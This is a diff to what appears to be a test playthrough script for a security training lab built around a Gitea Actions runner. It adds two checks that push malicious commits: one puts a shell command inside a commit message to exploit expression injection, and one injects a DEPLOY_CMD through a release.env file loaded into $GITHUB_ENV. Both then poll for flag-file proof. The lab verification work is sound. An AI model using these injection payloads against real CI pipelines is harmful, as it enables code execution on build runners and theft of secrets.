@@ -333,6 +333,35 @@ if enabled pbac_4; then
   else no pbac_4 "no leaked token on runner"; fi
 fi
 
+echo "### Pipeline execution / injection kill-chains (Gitea Actions) ###"
+
+# --- ppe_1: untrusted commit message interpolated into a run: step -> RCE on the runner ----
+if enabled ppe_1; then
+  on runner 'rm -f /tmp/ppe1-proof' >/dev/null 2>&1
+  W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
+  ( cd "$W/app"; date > .ppe1-trig
+    git -c user.email=atk@x -c user.name=atk add -A
+    git -c user.email=atk@x -c user.name=atk commit -q -m 'pwned"; cat /opt/minilab2/ppe1-flag.txt > /tmp/ppe1-proof; echo "x'
+    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
+  rm -rf "$W"
+  out=$(on runner 'for i in $(seq 1 50); do [ -s /tmp/ppe1-proof ] && break; sleep 3; done; cat /tmp/ppe1-proof 2>/dev/null')
+  chk ppe_1 ppe_1-expression-injection "$out"
+fi
+
+# --- ppe_3: attacker edits the config file loaded into $GITHUB_ENV -> defines $DEPLOY_CMD ----
+if enabled ppe_3; then
+  on runner 'rm -f /tmp/ppe3-proof' >/dev/null 2>&1
+  W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
+  ( cd "$W/app"
+    printf 'APP_VERSION=1.0\nDEPLOY_CMD=cat /opt/minilab2/ppe3-flag.txt > /tmp/ppe3-proof\n' > ci/release.env
+    git -c user.email=atk@x -c user.name=atk add -A
+    git -c user.email=atk@x -c user.name=atk commit -q -m "bump release config"
+    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
+  rm -rf "$W"
+  out=$(on runner 'for i in $(seq 1 50); do [ -s /tmp/ppe3-proof ] && break; sleep 3; done; cat /tmp/ppe3-proof 2>/dev/null')
+  chk ppe_3 ppe_3-github-env-injection "$out"
+fi
+
 echo
 printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
 [ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
